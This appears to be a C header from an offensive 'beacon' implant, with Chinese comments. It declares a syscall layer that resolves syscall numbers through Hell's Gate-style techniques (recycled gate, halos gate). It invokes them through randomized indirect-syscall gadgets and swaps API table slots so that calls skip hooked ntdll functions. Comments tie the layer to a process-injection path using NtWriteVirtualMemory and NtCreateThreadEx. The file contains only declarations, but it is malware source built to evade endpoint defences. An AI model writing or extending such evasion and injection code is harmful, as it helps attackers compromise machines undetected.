#pragma once

#include "beacon_common.h"
#include "beacon_api.h"

/*
 * beacon_syscall.h -- syscall 层公共接口。
 *
 * 设计要点（详见 docs/SYSCALL_PLAN.md）：
 *  1. SSN 解析（SyscallProviderOps）与调用方式（SyscallInvokeOps）正交；
 *  2. 解析失败逐 API 回退 native（直接调 ntdll 导出），不牺牲稳定性；
 *  3. 通过 SyscallBindApiTable 覆盖 Win32Api 表内槽位，使用方零改动；
 *  4. 新增 API 是纯追加：枚举加一项 + g_syscall_apis[] 加一行。
 *
 * 当前实现范围（仅 x64）：
 *  - provider 只实现 recycled_gate / halos_gate / native（其余 gate 技术不实现）；
 *  - invoke 只实现 randomized（Embedded/Indirect/Egg 不实现）。
 *  freshycalls 排序与 hells 特征扫描作为 recycled/halos 的内部基础（gate_common），
 *  不作为独立 provider。
 */

/* ===== func_id 枚举（初始范围，追加式） =====
 * 数组（ssn/callable/provider_of）与 stubs_x64.asm 的偏移都依赖此顺序：
 *   g_syscall_ssn_table 偏移 = func_id * 4。
 * 约束：永不重排、永不删除，新增项放在 SYSCALL_NT_COUNT 之前。
 */
enum {
    SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY,
    SYSCALL_NT_PROTECT_VIRTUAL_MEMORY,
    SYSCALL_NT_WRITE_VIRTUAL_MEMORY,     /* 阶段 5 注入路径使用 */
    SYSCALL_NT_READ_VIRTUAL_MEMORY,      /* 预留 */
    SYSCALL_NT_OPEN_PROCESS,             /* 预留 */
    SYSCALL_NT_CREATE_THREAD_EX,
    SYSCALL_NT_WAIT_FOR_SINGLE_OBJECT,   /* 预留 */
    SYSCALL_NT_RESUME_THREAD,            /* 预留 */
    SYSCALL_NT_GET_CONTEXT_THREAD,       /* hwbp 依赖，预留 */
    SYSCALL_NT_SET_CONTEXT_THREAD,       /* hwbp 依赖，预留 */
    SYSCALL_NT_COUNT                     /* 永远放最后，数组定长用 */
};

#define SYSCALL_PROVIDER_MAX 8u          /* 链最大长度 */
#define SYSCALL_PROVIDER_NONE 0xFFu      /* provider_of 哨兵：未解析 */
#define SYSCALL_GADGET_POOL 64u          /* randomized 调用方式的 gadget 池大小（2 的幂） */

/* ===== SSN 解析 Provider ===== */

typedef struct SyscallProviderOps {
    const CHAR* name;                    /* 调试用名称 */
    BOOL (*Init)(VOID);                  /* 一次性初始化；失败则该 provider 不可用 */
    BOOL (*ResolveNumber)(UINT32 func_id, PUINT32 ssn_out); /* 失败返回 FALSE，由上层回退 */
    VOID (*Cleanup)(VOID);               /* 可选：释放 provider 资源 */
} SyscallProviderOps;

/* ===== 调用方式 Invoke ===== */

typedef struct SyscallInvokeOps {
    const CHAR* name;
    BOOL (*Init)(VOID);                  /* 可选：gadget 池等一次性准备 */
    PVOID (*GetCallable)(UINT32 func_id, UINT32 ssn); /* 返回可调用 stub；NULL = 该 API 保持 native */
} SyscallInvokeOps;

/* ===== API 描述表（追加式扩展的核心） ===== */

typedef struct SyscallApiDesc {
    UINT32 func_id;                      /* 枚举值 */
    const CHAR* name;                    /* "NtAllocateVirtualMemory"，provider 按名字符串解析 */
    SIZE_T api_slot_offset;              /* offsetof(Win32Api, pfnNtXxx)；0 = 不进绑定表 */
} SyscallApiDesc;

extern const SyscallApiDesc g_syscall_apis[];  /* 长度 = SYSCALL_NT_COUNT，见 syscall.c */

/* ===== 运行时状态 ===== */

typedef struct SyscallManager {
    UINT32 ssn[SYSCALL_NT_COUNT];        /* 解析结果；0 = 未解析 */
    UINT8  provider_of[SYSCALL_NT_COUNT];/* 解析该 API 的 provider 在 chain 中的下标；0xFF = 未解析 */
    PVOID  callable[SYSCALL_NT_COUNT];   /* invoke 层 GetCallable 结果缓存；NULL = native */
    PVOID  original[SYSCALL_NT_COUNT];   /* 绑定时保存的槽位原值（syscall 开关恢复用） */
    UINT32 name_hash[SYSCALL_NT_COUNT];  /* DJB2 函数名哈希（SyscallInit 预计算） */
    const SyscallProviderOps* chain[SYSCALL_PROVIDER_MAX];
    INT    chain_len;
    const SyscallInvokeOps* invoke;      /* 当前调用方式（仅 randomized） */
    BOOL   bound;                        /* 槽位当前是否被 callable 覆盖 */
} SyscallManager;

/* ===== 公共 API ===== */

/* 初始化管理器：组装默认链、预计算哈希、eager 解析全部 func_id（失败静默降级）。 */
BOOL SyscallInit(SyscallManager* sm);

/* 解析单个 func_id（沿链尝试，首个成功者生效）。已解析则直接返回 TRUE。 */
BOOL SyscallResolve(SyscallManager* sm, UINT32 func_id);

/* 用 callable 覆盖 Win32Api 表内敏感槽位；callable 为 NULL 的槽位保持原样。
 * 幂等：首次绑定时保存槽位原值到 original[]（供开关恢复）。 */
VOID SyscallBindApiTable(SyscallManager* sm, Win32Api* api);

/* 运行时开关：enabled=TRUE 用已缓存 callable 重新覆盖槽位（不重新解析）；
 * enabled=FALSE 恢复 original[] 原值（槽位回到普通 ntdll 地址）。
 * 传同一个 Win32Api*（即绑定时的表）。 */
VOID SyscallSetEnabled(SyscallManager* sm, Win32Api* api, BOOL enabled);

/* 释放 provider 资源并清空管理器。 */
VOID SyscallCleanup(SyscallManager* sm);

/* 内置 provider / invoke 实例 */
extern const SyscallProviderOps g_syscall_provider_recycled_gate;
extern const SyscallProviderOps g_syscall_provider_halos_gate;
extern const SyscallProviderOps g_syscall_provider_native;
extern const SyscallInvokeOps g_syscall_invoke_randomized;

/* randomized 调用方式的运行时表（invoke.c 定义，stubs_x64.asm 引用） */
extern PVOID g_syscall_gadget_pool[SYSCALL_GADGET_POOL];
extern UINT32 g_syscall_gadget_count;

#ifdef BEACON_TEST
/* ===== 测试挂钩（仅 BEACON_TEST 构建） ===== */

VOID SyscallTestSetChain(SyscallManager* sm, const SyscallProviderOps* const* chain, INT len);
VOID SyscallTestSetInvoke(SyscallManager* sm, const SyscallInvokeOps* invoke);
VOID SyscallTestResetChain(SyscallManager* sm);
VOID SyscallTestResolveAll(SyscallManager* sm);
UINT32 SyscallTestGetSsn(const SyscallManager* sm, UINT32 func_id);
PVOID SyscallTestGetCallable(const SyscallManager* sm, UINT32 func_id);
UINT8 SyscallTestGetProviderOf(const SyscallManager* sm, UINT32 func_id);
UINT32 SyscallTestGetGadgetCount(VOID);
#endif
